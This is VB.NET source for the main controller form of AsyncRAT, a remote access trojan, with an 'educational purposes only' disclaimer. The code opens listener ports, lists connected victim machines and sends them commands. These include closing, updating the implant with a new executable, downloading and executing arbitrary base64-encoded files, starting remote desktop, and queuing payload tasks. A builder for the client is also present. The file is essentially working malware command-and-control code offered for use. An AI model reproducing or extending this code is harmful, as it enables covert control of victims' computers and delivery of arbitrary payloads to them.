Imports System.ComponentModel
Imports System.IO

'

'       │ Author     : NYAN CAT
'       │ Name       : AsyncRAT

'       Contact Me   : https://github.com/NYAN-x-CAT

'       This program is distributed for educational purposes only.

'

Public Class Form1
    Public S As Server

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Messages.F = Me

        Pending.Req_In = New List(Of Incoming_Requests)
        Dim Req_In As New Threading.Thread(New Threading.ThreadStart(AddressOf Pending.Incoming))
        Req_In.Start()

        Pending.Req_Out = New List(Of Outcoming_Requests)
        Dim Req_Out As New Threading.Thread(New Threading.ThreadStart(AddressOf Pending.OutComing))
        Req_Out.Start()

        Try
            Dim PORTS As New Intro
            PORTS.ShowDialog()
            If PORTS.OK = True Then
                Dim A As String() = Split(PORTS.TextBox1.Text.Trim, ",")
                For i As Integer = 0 To A.Length - 1
                    If Not String.IsNullOrWhiteSpace(A(i)) Then
                        Settings.Ports.Add(A(i))
                        S = New Server
                        Dim listener As New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf S.Start))
                        listener.Start(A(i))
                    End If
                Next
                Settings.KEY = PORTS.TextBox2.Text
                PORTS.Close()
            Else
                Environment.Exit(0)
            End If
        Catch ex As Exception
            Debug.WriteLine("URL " + ex.Message)
        End Try


    End Sub

    Private Sub CLOSEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CLOSEToolStripMenuItem.Click
        If LV1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("CLOSE")
                For Each C As ListViewItem In LV1.SelectedItems
                    '   Dim x As Client = CType(C.Tag, Client)
                    '  x.Send(B)
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                Debug.WriteLine("CLOSEToolStripMenuItem " + ex.Message)
            End Try
        End If
    End Sub

    Private Sub UPDATEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UPDATEToolStripMenuItem.Click
        If LV1.SelectedItems.Count > 0 Then
            Try

                Dim o As New OpenFileDialog
                With o
                    .Filter = "(*.exe)|*.exe"
                    .Title = "Update Client"
                End With

                If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                    Dim B As Byte() = SB("UPDATE" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(o.FileName)))

                    For Each C As ListViewItem In LV1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                Debug.WriteLine("UPDATEToolStripMenuItem " + ex.Message)
            End Try
        End If
    End Sub

    Private Sub DownloadAndExecuteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadAndExecuteToolStripMenuItem.Click
        If LV1.SelectedItems.Count > 0 Then
            Try

                Dim o As New OpenFileDialog
                With o
                    .Filter = "(*.*)|*.*"
                    .Title = "Download and Execute"
                End With

                If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                    Dim B As Byte() = SB("DW" & Settings.SPL & Path.GetExtension(o.FileName) & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(o.FileName)))

                    For Each C As ListViewItem In LV1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                Debug.WriteLine("DownloadAndExecuteToolStripMenuItem " + ex.Message)
            End Try
        End If
    End Sub

    Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        If LV1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("RD-")

                For Each C As ListViewItem In LV1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                Debug.WriteLine("RemoteDesktopToolStripMenuItem " + ex.Message)
            End Try
        End If
    End Sub

    Private Sub Timer_Status_Tick(sender As Object, e As EventArgs) Handles Timer_Status.Tick
        Try
            ToolStripStatusLabel1.Text = String.Format("Total Clients [{0}]       Selected Clients [{1}]       Listening Ports [{2}]       Password [{3}]", LV1.Items.Count.ToString, LV1.SelectedItems.Count.ToString, String.Join(",", Settings.Ports.ToList),Settings.KEY)
            Text = " AsyncRAT " + Settings.VER + " // " + DateTime.Now
        Catch ex As Exception
            Debug.WriteLine("Timer_Status " + ex.Message)
        End Try
    End Sub

    Private Sub Timer_Ping_Tick(sender As Object, e As EventArgs) Handles Timer_Ping.Tick
        If LV1.Items.Count > 0 Then
            Try

                Dim B As Byte() = SB("PING!")
                For Each C As ListViewItem In LV1.Items
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                Debug.WriteLine("Timer_Ping " + ex.Message)
            End Try
        End If
    End Sub

    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
        MsgBox("


       │ Author       : NYAN CAT

       │ Name         : AsyncRAT

       │ Contact Me   : https://github.com/NYAN-x-CAT

       │ This program is distributed for educational purposes only.


")
    End Sub

    Private Sub Form1_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        Try
            Environment.Exit(0)
        Catch ex As Exception
        End Try
    End Sub

    Private Sub LV1_MouseMove(sender As Object, e As MouseEventArgs) Handles LV1.MouseMove
        Try
            Dim hitInfo = LV1.HitTest(e.Location)
            If e.Button = MouseButtons.Left AndAlso (hitInfo.Item IsNot Nothing OrElse hitInfo.SubItem IsNot Nothing) Then LV1.Items(hitInfo.Item.Index).Selected = True
        Catch ex As Exception
            Debug.WriteLine("LV1_MouseMove " + ex.Message)
        End Try
    End Sub

    Private Sub LV1_KeyDown(sender As Object, e As KeyEventArgs) Handles LV1.KeyDown
        Try
            If e.Modifiers = Keys.Control AndAlso e.KeyCode = Keys.A Then
                If LV1.Items.Count > 0 Then
                    For Each x As ListViewItem In LV1.Items
                        x.Selected = True
                    Next
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub AddTaskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddTaskToolStripMenuItem.Click
        Try
            Dim T As New TaskForm
            T.ShowDialog()
            Dim TaskID As String = Guid.NewGuid.ToString
            Dim B As Byte() = Nothing
            If T.OK = True Then

                If T._CMD = "UPDATE" Then
                    B = SB("UPDATE" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(T._FILE)))
                ElseIf T._CMD = "DW" Then
                    B = SB("DW" & Settings.SPL & Path.GetExtension(T._FILE) & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(T._FILE)))
                End If

                Dim LV = ListView1.Items.Insert(0, ListView1.Items.Count + 1)
                LV.SubItems.Add(T._CMD + " = " + Path.GetFileName(T._FILE))
                LV.SubItems.Add(0)
                LV.Tag = TaskID
                ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)

                Dim NewDoTask As New TaskWorker With {
                    .Task = TaskID,
                    .B = B,
                    .F = Me
                }

                'Dim _Thread As New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf NewDoTask.Worker))
                '  _Thread.Start()
                Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf NewDoTask.Worker))
                T.Close()
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub RemoveTaskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveTaskToolStripMenuItem.Click
        Try
            If ListView1.Items.Count > 0 Then
                For Each x As ListViewItem In ListView1.SelectedItems
                    x.Remove()
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub BUILDERToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BUILDERToolStripMenuItem.Click
        Builder.ShowDialog()
    End Sub
End Class
